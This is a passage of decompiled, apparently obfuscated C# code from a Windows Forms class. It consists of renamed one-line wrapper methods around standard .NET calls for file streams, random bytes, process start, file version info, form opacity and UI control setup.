	// Token: 0x06000420 RID: 1056 RVA: 0x0000395E File Offset: 0x00001B5E
	static void smethod_49(PictureBox pictureBox_0, string string_0)
	{
		pictureBox_0.ImageLocation = string_0;
	}

	// Token: 0x06000421 RID: 1057 RVA: 0x00003967 File Offset: 0x00001B67
	static string smethod_50()
	{
		return Path.GetRandomFileName();
	}

	// Token: 0x06000422 RID: 1058 RVA: 0x0000396E File Offset: 0x00001B6E
	static FileStream smethod_51(string string_0, FileMode fileMode_0, FileAccess fileAccess_0)
	{
		return new FileStream(string_0, fileMode_0, fileAccess_0);
	}

	// Token: 0x06000423 RID: 1059 RVA: 0x00003978 File Offset: 0x00001B78
	static void smethod_52(Random random_1, byte[] byte_0)
	{
		random_1.NextBytes(byte_0);
	}

	// Token: 0x06000424 RID: 1060 RVA: 0x00003981 File Offset: 0x00001B81
	static void smethod_53(Stream stream_0, byte[] byte_0, int int_0, int int_1)
	{
		stream_0.Write(byte_0, int_0, int_1);
	}

	// Token: 0x06000425 RID: 1061 RVA: 0x0000398C File Offset: 0x00001B8C
	static void smethod_54(Stream stream_0)
	{
		stream_0.Close();
	}

	// Token: 0x06000426 RID: 1062 RVA: 0x00003994 File Offset: 0x00001B94
	static Process smethod_55(string string_0)
	{
		return Process.Start(string_0);
	}

	// Token: 0x06000427 RID: 1063 RVA: 0x0000374B File Offset: 0x0000194B
	static void smethod_56(SettingsBase settingsBase_0)
	{
		settingsBase_0.Save();
	}

	// Token: 0x06000428 RID: 1064 RVA: 0x0000399C File Offset: 0x00001B9C
	static FileVersionInfo smethod_57(string string_0)
	{
		return FileVersionInfo.GetVersionInfo(string_0);
	}

	// Token: 0x06000429 RID: 1065 RVA: 0x000039A4 File Offset: 0x00001BA4
	static string smethod_58(FileVersionInfo fileVersionInfo_0)
	{
		return fileVersionInfo_0.CompanyName;
	}

	// Token: 0x0600042A RID: 1066 RVA: 0x000039AC File Offset: 0x00001BAC
	static string smethod_59(FileVersionInfo fileVersionInfo_0)
	{
		return fileVersionInfo_0.FileDescription;
	}

	// Token: 0x0600042B RID: 1067 RVA: 0x000039B4 File Offset: 0x00001BB4
	static string smethod_60(FileVersionInfo fileVersionInfo_0)
	{
		return fileVersionInfo_0.LegalCopyright;
	}

	// Token: 0x0600042C RID: 1068 RVA: 0x000039BC File Offset: 0x00001BBC
	static int smethod_61(FileVersionInfo fileVersionInfo_0)
	{
		return fileVersionInfo_0.FileMajorPart;
	}

	// Token: 0x0600042D RID: 1069 RVA: 0x000039C4 File Offset: 0x00001BC4
	static double smethod_62(Form form_0)
	{
		return form_0.Opacity;
	}

	// Token: 0x0600042E RID: 1070 RVA: 0x000039CC File Offset: 0x00001BCC
	static void smethod_63(Form form_0, double double_0)
	{
		form_0.Opacity = double_0;
	}

	// Token: 0x0600042F RID: 1071 RVA: 0x000020BF File Offset: 0x000002BF
	static void smethod_64(int int_0)
	{
		Thread.Sleep(int_0);
	}

	// Token: 0x06000430 RID: 1072 RVA: 0x00002068 File Offset: 0x00000268
	static Type smethod_65(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	// Token: 0x06000431 RID: 1073 RVA: 0x0000376E File Offset: 0x0000196E
	static ComponentResourceManager smethod_66(Type type_0)
	{
		return new ComponentResourceManager(type_0);
	}

	// Token: 0x06000432 RID: 1074 RVA: 0x000039D5 File Offset: 0x00001BD5
	static TabPage smethod_67()
	{
		return new TabPage();
	}

	// Token: 0x06000433 RID: 1075 RVA: 0x000039DC File Offset: 0x00001BDC
	static PictureBox smethod_68()
	{
		return new PictureBox();
	}

	// Token: 0x06000434 RID: 1076 RVA: 0x000039E3 File Offset: 0x00001BE3
	static RichTextBox smethod_69()
	{
		return new RichTextBox();
	}

	// Token: 0x06000435 RID: 1077 RVA: 0x00002B8B File Offset: 0x00000D8B
	static ListBox smethod_70()
	{
		return new ListBox();
	}

	// Token: 0x06000436 RID: 1078 RVA: 0x00003776 File Offset: 0x00001976
	static void smethod_71(Control control_0)
	{
		control_0.SuspendLayout();
	}

	// Token: 0x06000437 RID: 1079 RVA: 0x000039EA File Offset: 0x00001BEA
	static void smethod_72(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	// Token: 0x06000438 RID: 1080 RVA: 0x0000377E File Offset: 0x0000197E
	static void smethod_73(Control control_0)
	{
		control_0.SuspendLayout();
	}

	// Token: 0x06000439 RID: 1081 RVA: 0x00002372 File Offset: 0x00000572
	static void smethod_74(Control control_0, Color color_0)
	{
		control_0.BackColor = color_0;
	}

	// Token: 0x0600043A RID: 1082 RVA: 0x00002FC1 File Offset: 0x000011C1
	static Control.ControlCollection smethod_75(Control control_0)
	{
		return control_0.Controls;
	}

	// Token: 0x0600043B RID: 1083 RVA: 0x00002B79 File Offset: 0x00000D79
	static void smethod_76(Control.ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	// Token: 0x0600043C RID: 1084 RVA: 0x0000305F File Offset: 0x0000125F
	static void smethod_77(Control control_0, DockStyle dockStyle_0)
	{
		control_0.Dock = dockStyle_0;
	}

	// Token: 0x0600043D RID: 1085 RVA: 0x000039F2 File Offset: 0x00001BF2
	static Font smethod_78(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	// Token: 0x0600043E RID: 1086 RVA: 0x000025DA File Offset: 0x000007DA
	static void smethod_79(Control control_0, Font font_0)
	{
		control_0.Font = font_0;
	}

	// Token: 0x040000D8 RID: 216
	private bool bool_0;

	// Token: 0x040000D9 RID: 217
	private static Random random_0 = Form1.smethod_34();

	// Token: 0x040000DA RID: 218
	private IContainer icontainer_0;
}
